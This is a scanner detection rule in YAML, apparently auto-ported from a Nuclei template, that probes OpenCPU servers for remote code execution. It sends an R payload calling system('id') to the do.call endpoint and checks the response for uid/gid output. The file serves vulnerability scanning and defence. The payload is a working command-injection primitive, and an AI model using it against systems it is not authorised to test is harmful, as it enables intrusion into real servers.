schema_version: 1
id: "cortex.community:opencpu-rce"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "OpenCPU - Remote Code Execution"
  description: "Check for remote code execution via OpenCPU was conducted. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://pulsesecurity.co.nz/articles/R-Shells"
    - "https://github.com/opencpu/opencpu/"
  cwes: [78]
  tags: ["rce", "opencpu", "oss", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Critical"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request:
      method: "POST"
      path: "/ocpu/library/base/R/do.call/json"
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
      body: "what=function(x){  return(system(paste('id'), intern %3d T))}&args={}\n"
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "uid=" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "gid=" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 201 } }
